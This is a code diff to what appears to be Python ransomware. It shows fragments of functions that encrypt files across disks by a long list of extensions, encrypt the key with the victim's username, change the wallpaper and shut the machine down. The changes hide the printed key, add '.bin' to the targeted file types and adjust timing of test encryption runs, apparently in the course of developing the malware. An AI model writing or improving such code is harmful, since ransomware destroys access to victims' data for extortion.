@@ -373,7 +373,7 @@ def start_encryption():
     try:
         mlock(key)
         mlock(key_b64)
-        print(key_b64.decode())
+        # print(key_b64.decode())
         encrypted_key = encrypt_key(bytes(key_b64))
         data = {
             "username": getpass.getuser(),
@@ -424,7 +424,11 @@ def start_encryption():
                 ):
                     encrypt_directory(disk, bytes(key))
         else:
+            start = time.time()
             encrypt_directory(r".\tests", bytes(key))
+            end = time.time()
+            print(end - start)
+
     finally:
         zeroize1(key)
         munlock(key)
@@ -447,7 +451,7 @@ def encrypt_directory(directory_path, key):
         ".cs", ".c", ".cc", ".cxx", ".cpp", ".pas", ".h", ".hpp", ".asm", ".go", ".kt", ".dart",
         ".scala", ".r", ".m", ".mm", ".hs", ".fs", ".fsi", ".rs", ".php", ".js", ".ts", ".py", ".pyw",
         ".cmd", ".bat", ".ps1", ".vbs", ".vbe", ".vb", ".pl", ".pm", ".jsp", ".asp", ".rb", ".java",
-        ".jar", ".class", ".sh", ".swift", ".scss", ".less", ".html", ".xhtml", ".css",
+        ".jar", ".class", ".sh", ".swift", ".scss", ".less", ".html", ".xhtml", ".css", ".bin",
         ".mp3", ".wav", ".m4a", ".aac", ".flac", ".ogg", ".alac", ".ape", ".wma", ".mid", ".m3u", ".m4u",
         ".swf", ".fla", ".wmv", ".mpg", ".mpeg", ".vob", ".asf", ".avi", ".mov", ".mp4",
         ".3gp", ".mkv", ".3g2", ".flv",
@@ -792,9 +796,8 @@ if __name__ == "__main__":
         change_wallpaper()
         shutdown()
     else:
-        start = time.time()
+
         start_encryption()
-        end = time.time()
-        print(end - start)
+
 
 
